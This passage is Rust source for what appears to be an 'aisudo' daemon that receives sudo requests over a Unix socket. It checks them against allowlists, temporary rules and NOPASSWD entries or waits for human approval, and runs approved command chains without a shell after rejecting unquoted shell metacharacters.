use aisudo_common::{
    ActiveTempRule, Decision, ExecOutput, ListRulesRequest, ListRulesResponse, RequestMode,
    SocketMessage, SudoRequest, SudoRequestRecord, SudoResponse, TempRuleRequest, TempRuleResponse,
};
use anyhow::Result;
use base64::Engine as _;
use std::os::unix::io::IntoRawFd;
use std::path::Path;
use std::sync::Arc;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::UnixListener;
use tracing::{error, info, warn};

use crate::config::ConfigHolder;
use crate::db::Database;
use crate::notification::{NotificationBackend, TempRuleRecord};
use crate::sudoers::SudoersCache;

/// Operator connecting two commands in a chain.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ChainOp {
    /// First command in the chain (no preceding operator).
    First,
    /// `;` — sequential, ignore exit code.
    Semi,
    /// `&&` — run next only if previous succeeded.
    And,
    /// `||` — run next only if previous failed.
    Or,
    /// `|` — pipe stdout of previous to stdin of next.
    Pipe,
}

/// A single command segment in a parsed chain.
#[derive(Debug, Clone, PartialEq, Eq)]
struct ChainSegment {
    /// The raw command string (trimmed).
    command: String,
    /// How this segment connects to the previous one.
    op: ChainOp,
}

/// Parse a command string into a chain of segments split on unquoted operators.
///
/// Supports: `;`, `&&`, `||`, `|`
/// Rejects (unquoted): `$`, `` ` ``, `(`, `)`, `>`, `<`, `\n`, bare `&`
///
/// Single and double quotes suppress operator/metacharacter detection.
/// Backslash escapes inside double quotes.
fn parse_command_chain(input: &str) -> Result<Vec<ChainSegment>, String> {
    let chars: Vec<char> = input.chars().collect();
    let len = chars.len();
    let mut segments: Vec<ChainSegment> = Vec::new();
    let mut current = String::new();
    let mut current_op = ChainOp::First;
    let mut i = 0;

    // Quote state
    let mut in_single_quote = false;
    let mut in_double_quote = false;

    while i < len {
        let c = chars[i];

        // Handle escape inside double quotes
        if in_double_quote && c == '\\' && i + 1 < len {
            current.push(c);
            current.push(chars[i + 1]);
            i += 2;
            continue;
        }

        // Toggle single quote (not inside double quotes)
        if c == '\'' && !in_double_quote {
            in_single_quote = !in_single_quote;
            current.push(c);
            i += 1;
            continue;
        }

        // Toggle double quote (not inside single quotes)
        if c == '"' && !in_single_quote {
            in_double_quote = !in_double_quote;
            current.push(c);
            i += 1;
            continue;
        }

        // Inside quotes, everything is literal
        if in_single_quote || in_double_quote {
            current.push(c);
            i += 1;
            continue;
        }

        // --- Outside quotes: check for rejected metacharacters ---
        match c {
            '$' => return Err("rejected: unquoted '$' (variable expansion/command substitution)".to_string()),
            '`' => return Err("rejected: unquoted '`' (backtick command substitution)".to_string()),
            '(' => return Err("rejected: unquoted '(' (subshell/grouping)".to_string()),
            ')' => return Err("rejected: unquoted ')' (subshell/grouping)".to_string()),
            '>' => return Err("rejected: unquoted '>' (redirection)".to_string()),
            '<' => return Err("rejected: unquoted '<' (redirection)".to_string()),
            '\n' => return Err("rejected: unquoted newline".to_string()),
            _ => {}
        }

        // Check for operators: &&, ||, ;, |, bare &
        if c == '&' {
            if i + 1 < len && chars[i + 1] == '&' {
                // && operator
                let cmd = current.trim().to_string();
                if cmd.is_empty() {
                    return Err("empty command before '&&'".to_string());
                }
                segments.push(ChainSegment { command: cmd, op: current_op });
                current_op = ChainOp::And;
                current.clear();
                i += 2;
                continue;
            } else {
                // Bare & (background) — rejected
                return Err("rejected: unquoted '&' (background execution)".to_string());
            }
        }

        if c == '|' {
            if i + 1 < len && chars[i + 1] == '|' {
                // || operator
                let cmd = current.trim().to_string();
                if cmd.is_empty() {
                    return Err("empty command before '||'".to_string());
                }
                segments.push(ChainSegment { command: cmd, op: current_op });
                current_op = ChainOp::Or;
                current.clear();
                i += 2;
                continue;
            } else {
                // | pipe operator
                let cmd = current.trim().to_string();
                if cmd.is_empty() {
                    return Err("empty command before '|'".to_string());
                }
                segments.push(ChainSegment { command: cmd, op: current_op });
                current_op = ChainOp::Pipe;
                current.clear();
                i += 1;
                continue;
            }
        }

        if c == ';' {
            let cmd = current.trim().to_string();
            if cmd.is_empty() {
                return Err("empty command before ';'".to_string());
            }
            segments.push(ChainSegment { command: cmd, op: current_op });
            current_op = ChainOp::Semi;
            current.clear();
            i += 1;
            continue;
        }

        current.push(c);
        i += 1;
    }

    // Check for unterminated quotes
    if in_single_quote {
        return Err("unterminated single quote".to_string());
    }
    if in_double_quote {
        return Err("unterminated double quote".to_string());
    }

    // Push the last segment
    let cmd = current.trim().to_string();
    if cmd.is_empty() {
        if segments.is_empty() {
            return Err("empty command".to_string());
        }
        return Err(format!("empty command after '{}'", match current_op {
            ChainOp::Semi => ";",
            ChainOp::And => "&&",
            ChainOp::Or => "||",
            ChainOp::Pipe => "|",
            ChainOp::First => "",
        }));
    }
    segments.push(ChainSegment { command: cmd, op: current_op });

    Ok(segments)
}

/// Check if a single (non-chained) command is allowed by the allowlist.
fn is_single_command_allowed(command: &str, allowlist: &[String]) -> bool {
    for pattern in allowlist {
        if command == pattern {
            return true;
        }
        if command.starts_with(pattern.as_str()) && command.as_bytes().get(pattern.len()) == Some(&b' ') {
            return true;
        }
    }
    false
}

/// Check if a single (non-chained) command is allowed by temp rules.
fn is_single_command_temp_rule_allowed(command: &str, rules: &[Vec<String>]) -> bool {
    for patterns in rules {
        for pattern in patterns {
            if command == pattern.as_str() {
                return true;
            }
            if command.starts_with(pattern.as_str())
                && command.as_bytes().get(pattern.len()) == Some(&b' ')
            {
                return true;
            }
        }
    }
    false
}

pub async fn run_socket_listener(
    config_holder: Arc<ConfigHolder>,
    db: Arc<Database>,
    backend: Arc<dyn NotificationBackend>,
) -> Result<()> {
    let socket_path = config_holder.config().socket_path.clone();
    let sudoers_cache = Arc::new(SudoersCache::new(300));

    // Ensure parent directory exists
    if let Some(parent) = socket_path.parent() {
        std::fs::create_dir_all(parent)?;
    }

    // Remove stale socket file
    if socket_path.exists() {
        std::fs::remove_file(&socket_path)?;
    }

    let listener = UnixListener::bind(&socket_path)?;

    // Make socket accessible (the daemon runs as root)
    set_socket_permissions(&socket_path)?;

    info!("Listening on Unix socket: {}", socket_path.display());

    loop {
        match listener.accept().await {
            Ok((stream, _addr)) => {
                let db = Arc::clone(&db);
                let backend = Arc::clone(&backend);
                let sudoers = Arc::clone(&sudoers_cache);
                let config = config_holder.config();
                let timeout = config.timeout_seconds;
                let allowlist = config.allowlist.clone();
                let max_stdin_bytes = config.limits.max_stdin_bytes;
                let max_temp_rule_duration = config.limits.max_temp_rule_duration_seconds;

                tokio::spawn(async move {
                    if let Err(e) =
                        handle_connection(stream, db, backend, sudoers, timeout, &allowlist, max_stdin_bytes, max_temp_rule_duration).await
                    {
                        error!("Connection handler error: {e:#}");
                    }
                });
            }
            Err(e) => {
                error!("Failed to accept connection: {e}");
            }
        }
    }
}

/// Resolve a UID to a username via the system passwd database.
fn resolve_username(uid: u32) -> Option<String> {
    nix::unistd::User::from_uid(nix::unistd::Uid::from_raw(uid))
        .ok()
        .flatten()
        .map(|u| u.name)
}

async fn handle_connection(
    stream: tokio::net::UnixStream,
    db: Arc<Database>,
    backend: Arc<dyn NotificationBackend>,
    sudoers: Arc<SudoersCache>,
    timeout_seconds: u32,
    allowlist: &[String],
    max_stdin_bytes: usize,
    max_temp_rule_duration: u32,
) -> Result<()> {
    // Extract the real UID of the connecting process via SO_PEERCRED.
    // This cannot be spoofed by the client (kernel-provided).
    let peer_uid = stream
        .peer_cred()
        .ok()
        .map(|cred| cred.uid());

    let (reader, mut writer) = stream.into_split();
    let mut buf_reader = BufReader::new(reader);
    let mut line = String::new();
    buf_reader.read_line(&mut line).await?;
    let line = line.trim().to_string();

    // Try SocketMessage envelope first, fall back to bare SudoRequest
    let result = if let Ok(msg) = serde_json::from_str::<SocketMessage>(&line) {
        match msg {
            SocketMessage::SudoRequest(mut request) => {
                override_user_from_peer(&mut request.user, peer_uid);
                handle_sudo_request(request, &mut writer, db, backend, sudoers, timeout_seconds, allowlist, max_stdin_bytes).await
            }
            SocketMessage::TempRuleRequest(mut request) => {
                override_user_from_peer(&mut request.user, peer_uid);
                handle_temp_rule_request(request, &mut writer, db, backend, max_temp_rule_duration).await
            }
            SocketMessage::ListRules(mut request) => {
                override_user_from_peer(&mut request.user, peer_uid);
                handle_list_rules(request, &mut writer, db, sudoers, allowlist).await
            }
        }
    } else {
        // Backward compat: try bare SudoRequest
        match serde_json::from_str::<SudoRequest>(&line) {
            Ok(mut request) => {
                override_user_from_peer(&mut request.user, peer_uid);
                handle_sudo_request(request, &mut writer, db, backend, sudoers, timeout_seconds, allowlist, max_stdin_bytes).await
            }
            Err(_e) => Err(anyhow::anyhow!("invalid request")),
        }
    };

    if let Err(ref e) = result {
        error!("Request handling error: {e:#}");
        let response = SudoResponse {
            request_id: String::new(),
            decision: Decision::Denied,
            error: Some("request failed".to_string()),
        };
        if let Ok(resp_json) = serde_json::to_string(&response) {
            let _ = writer.write_all(resp_json.as_bytes()).await;
            let _ = writer.write_all(b"\n").await;
        }
    }
    result
}

/// Override the user field with the real username from peer credentials.
/// If peer credentials are available, the client-supplied value is replaced;
/// if the UID cannot be resolved, we use the numeric UID as a string.
/// This prevents identity spoofing via $USER environment variable.
fn override_user_from_peer(user: &mut String, peer_uid: Option<u32>) {
    if let Some(uid) = peer_uid {
        let real_user = resolve_username(uid)
            .unwrap_or_else(|| format!("uid:{uid}"));
        if *user != real_user {
            warn!(
                "Peer credential mismatch: client claimed user='{}', actual uid={} ('{}')",
                user, uid, real_user
            );
        }
        *user = real_user;
    }
}

async fn handle_sudo_request(
    request: SudoRequest,
    writer: &mut tokio::net::unix::OwnedWriteHalf,
    db: Arc<Database>,
    backend: Arc<dyn NotificationBackend>,
    sudoers: Arc<SudoersCache>,
    timeout_seconds: u32,
    allowlist: &[String],
    max_stdin_bytes: usize,
) -> Result<()> {
    let mode = request.mode;
    info!(
        "Received sudo request: user={} command={} mode={:?}",
        request.user, request.command, mode
    );

    // Decode stdin if present
    let stdin_bytes = if let Some(ref stdin_b64) = request.stdin {
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(stdin_b64)
            .map_err(|_| anyhow::anyhow!("invalid stdin encoding"))?;
        if decoded.len() > max_stdin_bytes {
            warn!(
                "stdin too large: {} bytes (max {})",
                decoded.len(),
                max_stdin_bytes
            );
            let response = SudoResponse {
                request_id: String::new(),
                decision: Decision::Denied,
                error: Some(format!(
                    "stdin exceeds size limit ({} bytes, max {})",
                    decoded.len(),
                    max_stdin_bytes
                )),
            };
            let resp_json = serde_json::to_string(&response)?;
            writer.write_all(resp_json.as_bytes()).await?;
            writer.write_all(b"\n").await?;
            writer.flush().await?;
            return Ok(());
        }
        info!("Request includes stdin: {} bytes", decoded.len());
        Some(decoded)
    } else {
        None
    };

    // Check allowlist first - auto-approved commands skip rate limiting
    let command = request.command.clone();
    let cwd = request.cwd.clone();
    if is_allowed(&command, allowlist) {
        info!("Command auto-approved via allowlist: {}", command);
        let record = SudoRequestRecord::new(request, timeout_seconds);
        db.insert_request(&record)?;
        db.update_decision(&record.id, Decision::Approved, "allowlist")?;
        let response = SudoResponse {
            request_id: record.id,
            decision: Decision::Approved,
            error: None,
        };
        let resp_json = serde_json::to_string(&response)?;
        writer.write_all(resp_json.as_bytes()).await?;
        writer.write_all(b"\n").await?;

        if mode == RequestMode::Exec {
            let segments = parse_command_chain(&command)
                .map_err(|e| anyhow::anyhow!("parse error: {e}"))?;
            exec_command_chain(&segments, &cwd, stdin_bytes, writer).await?;
        }
        return Ok(());
    }

    // Check active temp rules - auto-approved commands skip rate limiting
    if is_temp_rule_allowed(&db, &request.user, &command)? {
        info!("Command auto-approved via temp rule: {}", command);
        let record = SudoRequestRecord::new(request, timeout_seconds);
        db.insert_request(&record)?;
        db.update_decision(&record.id, Decision::Approved, "temp_rule")?;
        let response = SudoResponse {
            request_id: record.id,
            decision: Decision::Approved,
            error: None,
        };
        let resp_json = serde_json::to_string(&response)?;
        writer.write_all(resp_json.as_bytes()).await?;
        writer.write_all(b"\n").await?;

        if mode == RequestMode::Exec {
            let segments = parse_command_chain(&command)
                .map_err(|e| anyhow::anyhow!("parse error: {e}"))?;
            exec_command_chain(&segments, &cwd, stdin_bytes, writer).await?;
        }
        return Ok(());
    }

    // Check NOPASSWD rules (unless skip_nopasswd is set, i.e. retry after sudo -n failed)
    if !request.skip_nopasswd {
        let user = request.user.clone();
        let cmd = command.clone();
        let sudoers_ref = Arc::clone(&sudoers);
        let is_nopasswd = tokio::task::spawn_blocking(move || {
            sudoers_ref.is_nopasswd_allowed(&user, &cmd)
        })
        .await?;

        if is_nopasswd {
            info!("Command matches NOPASSWD rule, telling CLI to use sudo: {}", command);
            let record = SudoRequestRecord::new(request, timeout_seconds);
            db.insert_request(&record)?;
            db.update_decision(&record.id, Decision::UseSudo, "nopasswd")?;
            let response = SudoResponse {
                request_id: record.id,
                decision: Decision::UseSudo,
                error: None,
            };
            let resp_json = serde_json::to_string(&response)?;
            writer.write_all(resp_json.as_bytes()).await?;
            writer.write_all(b"\n").await?;
            writer.flush().await?;
            return Ok(());
        }
    }

    // Rate limiting: max 30 non-allowlisted requests per minute per user
    if !db.check_rate_limit(&request.user, 30)? {
        warn!("Rate limit exceeded for user: {}", request.user);
        let response = SudoResponse {
            request_id: String::new(),
            decision: Decision::Denied,
            error: Some("rate limit exceeded".to_string()),
        };
        let resp_json = serde_json::to_string(&response)?;
        writer.write_all(resp_json.as_bytes()).await?;
        writer.write_all(b"\n").await?;
        writer.flush().await?;
        return Ok(());
    }

    // Create request record
    let record = SudoRequestRecord::new(request, timeout_seconds);
    db.insert_request(&record)?;

    // Send notification and wait for response
    let (decision, error_msg) = match backend.send_and_wait(&record).await {
        Ok(d) => (d, None),
        Err(e) => {
            error!("Notification backend error for request {}: {e:#}", record.id);
            (Decision::Denied, Some("notification error".to_string()))
        }
    };

    // Update database
    db.update_decision(&record.id, decision, backend.name())?;

    // Send response
    let response = SudoResponse {
        request_id: record.id,
        decision,
        error: error_msg,
    };
    let resp_json = serde_json::to_string(&response)?;
    writer.write_all(resp_json.as_bytes()).await?;
    writer.write_all(b"\n").await?;

    // If exec mode and approved, execute via shell (human approved the exact command)
    if mode == RequestMode::Exec && decision == Decision::Approved {
        exec_command(&command, &cwd, stdin_bytes, writer, true).await?;
    }

    Ok(())
}

fn is_temp_rule_allowed(db: &Database, user: &str, command: &str) -> Result<bool> {
    // Try parsing as a command chain. If parsing fails, deny.
    let segments = match parse_command_chain(command) {
        Ok(s) => s,
        Err(_) => return Ok(false),
    };
    let rules_json = db.get_active_temp_rules(user)?;
    let mut all_rules: Vec<Vec<String>> = Vec::new();
    for patterns_json in &rules_json {
        let patterns: Vec<String> = serde_json::from_str(patterns_json)?;
        all_rules.push(patterns);
    }
    // Every sub-command must match at least one temp rule pattern.
    Ok(segments.iter().all(|seg| is_single_command_temp_rule_allowed(&seg.command, &all_rules)))
}

async fn handle_temp_rule_request(
    request: TempRuleRequest,
    writer: &mut tokio::net::unix::OwnedWriteHalf,
    db: Arc<Database>,
    backend: Arc<dyn NotificationBackend>,
    max_temp_rule_duration: u32,
) -> Result<()> {
    info!(
        "Received temp rule request: user={} patterns={:?} duration={}s",
        request.user, request.patterns, request.duration_seconds
    );

    // Validate duration
    if request.duration_seconds > max_temp_rule_duration {
        let response = TempRuleResponse {
            request_id: String::new(),
            decision: Decision::Denied,
            error: Some(format!(
                "duration {}s exceeds maximum {}s",
                request.duration_seconds, max_temp_rule_duration
            )),
            expires_at: None,
        };
        let resp_json = serde_json::to_string(&response)?;
        writer.write_all(resp_json.as_bytes()).await?;
        writer.write_all(b"\n").await?;
        writer.flush().await?;
        return Ok(());
    }

    if request.patterns.is_empty() {
        let response = TempRuleResponse {
            request_id: String::new(),
            decision: Decision::Denied,
            error: Some("no patterns provided".to_string()),
            expires_at: None,
        };
        let resp_json = serde_json::to_string(&response)?;
        writer.write_all(resp_json.as_bytes()).await?;
        writer.write_all(b"\n").await?;
        writer.flush().await?;
        return Ok(());
    }

    let id = uuid::Uuid::new_v4().to_string();
    let nonce = uuid::Uuid::new_v4().to_string();
    let now = chrono::Utc::now();
    let requested_at = now.to_rfc3339();
    let expires_at = (now + chrono::Duration::seconds(request.duration_seconds as i64)).to_rfc3339();
    let patterns_json = serde_json::to_string(&request.patterns)?;

    db.insert_temp_rule(
        &id,
        &request.user,
        &patterns_json,
        request.duration_seconds,
        &requested_at,
        &expires_at,
        &nonce,
        request.reason.as_deref(),
    )?;

    let record = TempRuleRecord {
        id: id.clone(),
        user: request.user.clone(),
        patterns: request.patterns.clone(),
        duration_seconds: request.duration_seconds,
        expires_at: expires_at.clone(),
        nonce: nonce.clone(),
        reason: request.reason.clone(),
    };

    let (decision, error_msg) = match backend.send_temp_rule_and_wait(&record).await {
        Ok(d) => (d, None),
        Err(e) => {
            error!("Notification backend error for temp rule {id}: {e:#}");
            (Decision::Denied, Some("notification error".to_string()))
        }
    };

    db.update_temp_rule_decision(&id, decision, backend.name())?;

    let response = TempRuleResponse {
        request_id: id,
        decision,
        error: error_msg,
        expires_at: if decision == Decision::Approved {
            Some(expires_at)
        } else {
            None
        },
    };
    let resp_json = serde_json::to_string(&response)?;
    writer.write_all(resp_json.as_bytes()).await?;
    writer.write_all(b"\n").await?;
    writer.flush().await?;

    Ok(())
}

async fn handle_list_rules(
    request: ListRulesRequest,
    writer: &mut tokio::net::unix::OwnedWriteHalf,
    db: Arc<Database>,
    sudoers: Arc<SudoersCache>,
    allowlist: &[String],
) -> Result<()> {
    info!("Received list-rules request for user={}", request.user);

    let user = request.user.clone();

    // Gather temp rules from DB
    let temp_rule_rows = db.get_active_temp_rules_detailed(&user)?;
    let temp_rules: Vec<ActiveTempRule> = temp_rule_rows
        .into_iter()
        .filter_map(|(patterns_json, expires_at)| {
            let patterns: Vec<String> = serde_json::from_str(&patterns_json).ok()?;
            Some(ActiveTempRule {
                patterns,
                expires_at,
            })
        })
        .collect();

    // Gather NOPASSWD rules via spawn_blocking
    let sudoers_ref = Arc::clone(&sudoers);
    let user_clone = user.clone();
    let nopasswd_rules = tokio::task::spawn_blocking(move || {
        sudoers_ref.get_nopasswd_rules(&user_clone)
    })
    .await?;

    let response = ListRulesResponse {
        allowlist: allowlist.to_vec(),
        temp_rules,
        nopasswd_rules,
    };

    let resp_json = serde_json::to_string(&response)?;
    writer.write_all(resp_json.as_bytes()).await?;
    writer.write_all(b"\n").await?;
    writer.flush().await?;

    Ok(())
}

/// Execute a command and stream stdout/stderr back over the socket.
///
/// When `use_shell` is true, the command is passed to `sh -c` (for human-approved commands).
/// When `use_shell` is false, the command is split on whitespace and exec'd directly
/// without a shell, so metacharacters like `;`, `|`, `$()` are not interpreted.
/// This is used for auto-approved (allowlist/temp rule) commands.
async fn exec_command(
    command: &str,
    cwd: &str,
    stdin_bytes: Option<Vec<u8>>,
    writer: &mut tokio::net::unix::OwnedWriteHalf,
    use_shell: bool,
) -> Result<()> {
    use tokio::process::Command;

    info!("Executing command (shell={}): {command}", use_shell);

    let mut cmd = if use_shell {
        let mut c = Command::new("sh");
        c.arg("-c").arg(command);
        c
    } else {
        let mut parts = command.split_whitespace();
        let binary = parts.next().ok_or_else(|| anyhow::anyhow!("empty command"))?;
        let mut c = Command::new(binary);
        c.args(parts);
        c
    };

    let mut child = cmd
        .current_dir(cwd)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .stdin(if stdin_bytes.is_some() {
            std::process::Stdio::piped()
        } else {
            std::process::Stdio::null()
        })
        .spawn()?;

    // Write stdin to child process if present
    if let Some(data) = stdin_bytes {
        if let Some(mut stdin_pipe) = child.stdin.take() {
            tokio::spawn(async move {
                if let Err(e) = stdin_pipe.write_all(&data).await {
                    error!("Failed to write stdin to child: {e}");
                }
                // Dropping stdin_pipe closes the pipe, signaling EOF to the child
            });
        }
    }

    let stdout = child.stdout.take();
    let stderr = child.stderr.take();

    // Use a channel to collect output from both streams, then write serially.
    let (tx, mut rx) = tokio::sync::mpsc::channel::<ExecOutput>(64);

    if let Some(stdout) = stdout {
        let tx_out = tx.clone();
        tokio::spawn(async move {
            use tokio::io::AsyncReadExt;
            let mut reader = BufReader::new(stdout);
            let mut buf = vec![0u8; 4096];
            loop {
                match reader.read(&mut buf).await {
                    Ok(0) => break,
                    Ok(n) => {
                        let data = String::from_utf8_lossy(&buf[..n]).to_string();
                        let _ = tx_out
                            .send(ExecOutput {
                                stream: "stdout".to_string(),
                                data,
                                exit_code: None,
                            })
                            .await;
                    }
                    Err(_) => break,
                }
            }
        });
    }

    if let Some(stderr) = stderr {
        let tx_err = tx.clone();
        tokio::spawn(async move {
            use tokio::io::AsyncReadExt;
            let mut reader = BufReader::new(stderr);
            let mut buf = vec![0u8; 4096];
            loop {
                match reader.read(&mut buf).await {
                    Ok(0) => break,
                    Ok(n) => {
                        let data = String::from_utf8_lossy(&buf[..n]).to_string();
                        let _ = tx_err
                            .send(ExecOutput {
                                stream: "stderr".to_string(),
                                data,
                                exit_code: None,
                            })
                            .await;
                    }
                    Err(_) => break,
                }
            }
        });
    }

    // Drop the last sender so rx completes when both streams are done
    drop(tx);

    // Forward all output to the socket
    while let Some(output) = rx.recv().await {
        let json = serde_json::to_string(&output)?;
        writer.write_all(json.as_bytes()).await?;
        writer.write_all(b"\n").await?;
        writer.flush().await?;
    }

    // Wait for exit code
    let status = child.wait().await?;
    let exit_code = status.code().unwrap_or(1);

    info!("Command finished with exit code: {exit_code}");

    let exit_msg = ExecOutput {
        stream: "exit".to_string(),
        data: String::new(),
        exit_code: Some(exit_code),
    };
    let json = serde_json::to_string(&exit_msg)?;
    writer.write_all(json.as_bytes()).await?;
    writer.write_all(b"\n").await?;
    writer.flush().await?;

    Ok(())
}

/// Split a single command string into argv, respecting single and double quotes.
/// This is used for direct exec (no shell) of individual commands in a chain.
fn split_command_argv(command: &str) -> Result<Vec<String>> {
    let mut args: Vec<String> = Vec::new();
    let mut current = String::new();
    let chars: Vec<char> = command.chars().collect();
    let len = chars.len();
    let mut i = 0;
    let mut in_single_quote = false;
    let mut in_double_quote = false;

    while i < len {
        let c = chars[i];

        if in_single_quote {
            if c == '\'' {
                in_single_quote = false;
            } else {
                current.push(c);
            }
            i += 1;
            continue;
        }

        if in_double_quote {
            if c == '\\' && i + 1 < len {
                let next = chars[i + 1];
                match next {
                    '"' | '\\' => {
                        current.push(next);
                        i += 2;
                        continue;
                    }
                    _ => {
                        current.push(c);
                        i += 1;
                        continue;
                    }
                }
            }
            if c == '"' {
                in_double_quote = false;
            } else {
                current.push(c);
            }
            i += 1;
            continue;
        }

        match c {
            '\'' => in_single_quote = true,
            '"' => in_double_quote = true,
            ' ' | '\t' => {
                if !current.is_empty() {
                    args.push(current.clone());
                    current.clear();
                }
            }
            _ => current.push(c),
        }
        i += 1;
    }

    if !current.is_empty() {
        args.push(current);
    }

    if args.is_empty() {
        return Err(anyhow::anyhow!("empty command"));
    }

    Ok(args)
}

/// Execute a parsed command chain without a shell.
///
/// Handles `;` (sequential), `&&` (and), `||` (or), and `|` (pipe) operators.
/// Each individual command is exec'd directly — no shell interpretation.
/// Output is streamed back to the client via ExecOutput JSON lines.
async fn exec_command_chain(
    segments: &[ChainSegment],
    cwd: &str,
    stdin_bytes: Option<Vec<u8>>,
    writer: &mut tokio::net::unix::OwnedWriteHalf,
) -> Result<()> {
    info!("Executing command chain ({} segments)", segments.len());

    let mut last_exit_code: i32 = 0;
    let mut i = 0;

    while i < segments.len() {
        let seg = &segments[i];

        // Check conditional operators
        match seg.op {
            ChainOp::And => {
                if last_exit_code != 0 {
                    // Skip this command (and any following pipe group)
                    i = skip_pipe_group(segments, i);
                    continue;
                }
            }
            ChainOp::Or => {
                if last_exit_code == 0 {
                    i = skip_pipe_group(segments, i);
                    continue;
                }
            }
            ChainOp::First | ChainOp::Semi | ChainOp::Pipe => {}
        }

        // Collect a pipe group: consecutive segments connected by Pipe
        let pipe_start = i;
        let mut pipe_end = i + 1;
        while pipe_end < segments.len() && segments[pipe_end].op == ChainOp::Pipe {
            pipe_end += 1;
        }
        let pipe_group = &segments[pipe_start..pipe_end];

        if pipe_group.len() == 1 {
            // Single command — no piping needed
            last_exit_code = exec_single_command(
                &pipe_group[0].command,
                cwd,
                if i == 0 { stdin_bytes.clone() } else { None },
                writer,
            ).await?;
        } else {
            // Pipeline: connect stdout→stdin between stages
            last_exit_code = exec_pipeline(
                pipe_group,
                cwd,
                if i == 0 { stdin_bytes.clone() } else { None },
                writer,
            ).await?;
        }

        i = pipe_end;
    }

    // Send final exit code
    let exit_msg = ExecOutput {
        stream: "exit".to_string(),
        data: String::new(),
        exit_code: Some(last_exit_code),
    };
    let json = serde_json::to_string(&exit_msg)?;
    writer.write_all(json.as_bytes()).await?;
    writer.write_all(b"\n").await?;
    writer.flush().await?;

    Ok(())
}

/// Skip past a pipe group starting at index `start`.
/// Returns the index of the next segment after the pipe group.
fn skip_pipe_group(segments: &[ChainSegment], start: usize) -> usize {
    let mut i = start + 1;
    while i < segments.len() && segments[i].op == ChainOp::Pipe {
        i += 1;
    }
    i
}

/// Execute a single command (no piping), streaming output back to the writer.
/// Returns the exit code.
async fn exec_single_command(
    command: &str,
    cwd: &str,
    stdin_bytes: Option<Vec<u8>>,
    writer: &mut tokio::net::unix::OwnedWriteHalf,
) -> Result<i32> {
    use tokio::process::Command;

    let argv = split_command_argv(command)?;
    let mut cmd = Command::new(&argv[0]);
    if argv.len() > 1 {
        cmd.args(&argv[1..]);
    }

    let mut child = cmd
        .current_dir(cwd)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .stdin(if stdin_bytes.is_some() {
            std::process::Stdio::piped()
        } else {
            std::process::Stdio::null()
        })
        .spawn()?;

    if let Some(data) = stdin_bytes {
        if let Some(mut stdin_pipe) = child.stdin.take() {
            tokio::spawn(async move {
                let _ = stdin_pipe.write_all(&data).await;
            });
        }
    }

    stream_child_output(&mut child, writer).await
}

/// Execute a pipeline of commands, connecting stdout→stdin between stages.
/// Streams the last command's stdout/stderr back to the writer.
/// Returns the last command's exit code.
async fn exec_pipeline(
    segments: &[ChainSegment],
    cwd: &str,
    stdin_bytes: Option<Vec<u8>>,
    writer: &mut tokio::net::unix::OwnedWriteHalf,
) -> Result<i32> {
    use std::os::unix::io::FromRawFd;
    use tokio::process::Command;

    let mut children: Vec<tokio::process::Child> = Vec::new();
    // The read-end fd from the previous stage's pipe, to be used as stdin for the next.
    let mut prev_read_fd: Option<std::os::unix::io::RawFd> = None;

    for (idx, seg) in segments.iter().enumerate() {
        let argv = split_command_argv(&seg.command)?;
        let mut cmd = Command::new(&argv[0]);
        if argv.len() > 1 {
            cmd.args(&argv[1..]);
        }

        let is_last = idx == segments.len() - 1;

        // Configure stdin
        let stdin_cfg = if let Some(fd) = prev_read_fd.take() {
            // Safety: fd is a valid open file descriptor from pipe() that we own.
            unsafe { std::process::Stdio::from_raw_fd(fd) }
        } else if idx == 0 && stdin_bytes.is_some() {
            std::process::Stdio::piped()
        } else {
            std::process::Stdio::null()
        };

        // Configure stdout: create an OS pipe for intermediate stages
        let stdout_cfg = if is_last {
            std::process::Stdio::piped()
        } else {
            let (read_fd, write_fd) = nix::unistd::pipe()?;
            prev_read_fd = Some(read_fd.into_raw_fd());
            // Safety: write_fd is a valid open file descriptor from pipe() that we own.
            unsafe { std::process::Stdio::from_raw_fd(write_fd.into_raw_fd()) }
        };

        let mut child = cmd
            .current_dir(cwd)
            .stdin(stdin_cfg)
            .stdout(stdout_cfg)
            .stderr(std::process::Stdio::piped())
            .spawn()?;

        // Feed stdin_bytes to the first process
        if idx == 0 {
            if let Some(ref data) = stdin_bytes {
                if let Some(mut stdin_pipe) = child.stdin.take() {
                    let data = data.clone();
                    tokio::spawn(async move {
                        let _ = stdin_pipe.write_all(&data).await;
                    });
                }
            }
        }

        // Drain intermediate stderr so pipes don't block
        if !is_last {
            if let Some(stderr) = child.stderr.take() {
                tokio::spawn(async move {
                    use tokio::io::AsyncReadExt;
                    let mut reader = BufReader::new(stderr);
                    let mut buf = vec![0u8; 4096];
                    loop {
                        match reader.read(&mut buf).await {
                            Ok(0) | Err(_) => break,
                            Ok(_) => {}
                        }
                    }
                });
            }
        }

        children.push(child);
    }

    // Stream output from the last child
    let last_idx = children.len() - 1;
    let last_child = &mut children[last_idx];
    let exit_code = stream_child_output(last_child, writer).await?;

    // Wait for all children to finish
    for child in children.iter_mut() {
        let _ = child.wait().await;
    }

    Ok(exit_code)
}

/// Stream stdout/stderr from a child process to the writer, then wait for exit.
/// Returns the exit code.
async fn stream_child_output(
    child: &mut tokio::process::Child,
    writer: &mut tokio::net::unix::OwnedWriteHalf,
) -> Result<i32> {
    let stdout = child.stdout.take();
    let stderr = child.stderr.take();

    let (tx, mut rx) = tokio::sync::mpsc::channel::<ExecOutput>(64);

    if let Some(stdout) = stdout {
        let tx_out = tx.clone();
        tokio::spawn(async move {
            use tokio::io::AsyncReadExt;
            let mut reader = BufReader::new(stdout);
            let mut buf = vec![0u8; 4096];
            loop {
                match reader.read(&mut buf).await {
                    Ok(0) => break,
                    Ok(n) => {
                        let data = String::from_utf8_lossy(&buf[..n]).to_string();
                        let _ = tx_out.send(ExecOutput {
                            stream: "stdout".to_string(),
                            data,
                            exit_code: None,
                        }).await;
                    }
                    Err(_) => break,
                }
            }
        });
    }

    if let Some(stderr) = stderr {
        let tx_err = tx.clone();
        tokio::spawn(async move {
            use tokio::io::AsyncReadExt;
            let mut reader = BufReader::new(stderr);
            let mut buf = vec![0u8; 4096];
            loop {
                match reader.read(&mut buf).await {
                    Ok(0) => break,
                    Ok(n) => {
                        let data = String::from_utf8_lossy(&buf[..n]).to_string();
                        let _ = tx_err.send(ExecOutput {
